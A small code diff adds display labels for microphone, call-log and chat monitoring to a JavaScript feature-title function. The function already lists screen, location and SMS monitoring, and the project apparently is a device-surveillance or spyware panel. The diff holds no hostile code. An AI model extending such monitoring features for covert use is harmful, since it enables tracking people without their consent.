@@ -815,6 +815,9 @@ function getFeatureTitle(feature) {
     case 'screen': return 'Monitor Screen';
     case 'location': return 'Monitor Location';
     case 'sms': return 'Monitor SMS';
+    case 'mic': return 'Monitor Mic';
+    case 'calllog': return 'Monitor Call Log';
+    case 'chats': return 'Monitor Chats';
     default: return feature;
   }
 }
